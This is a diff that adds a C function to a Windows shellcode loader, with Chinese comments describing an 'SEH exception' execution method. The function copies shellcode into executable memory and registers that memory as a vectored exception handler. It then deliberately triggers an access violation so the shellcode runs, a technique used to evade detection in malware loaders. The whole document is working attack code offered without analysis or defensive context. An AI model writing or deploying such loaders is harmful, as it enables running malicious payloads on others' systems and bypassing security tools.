@@ -1,0 +1,40 @@
+// SEH异常加载方式：通过访问冲突异常执行Shellcode
+void ExecuteLoader(PBYTE shellcode, SIZE_T shellcodeSize) {
+#ifdef _DEBUG
+    printf("[*] SEH异常方式执行Shellcode\n");
+#endif
+    
+    // 分配可执行内存
+    LPVOID exec_mem = VirtualAlloc(NULL, shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    if (!exec_mem) {
+#ifdef _DEBUG
+        printf("[!] VirtualAlloc失败: %d\n", GetLastError());
+#endif
+        return;
+    }
+    
+    // 复制Shellcode
+    memcpy(exec_mem, shellcode, shellcodeSize);
+    
+    // 设置SEH异常处理
+    PVOID oldHandler = AddVectoredExceptionHandler(1, (PVECTORED_EXCEPTION_HANDLER)exec_mem);
+    if (!oldHandler) {
+#ifdef _DEBUG
+        printf("[!] 添加SEH处理器失败: %d\n", GetLastError());
+#endif
+        VirtualFree(exec_mem, 0, MEM_RELEASE);
+        return;
+    }
+    
+#ifdef _DEBUG
+    printf("[*] SEH处理器设置成功，地址: %p\n", exec_mem);
+#endif
+    
+    // 触发异常以执行Shellcode
+    volatile int* p = NULL;
+    *p = 0;  // 触发访问冲突异常
+    
+    // 清理
+    RemoveVectoredExceptionHandler(oldHandler);
+    VirtualFree(exec_mem, 0, MEM_RELEASE);
+}
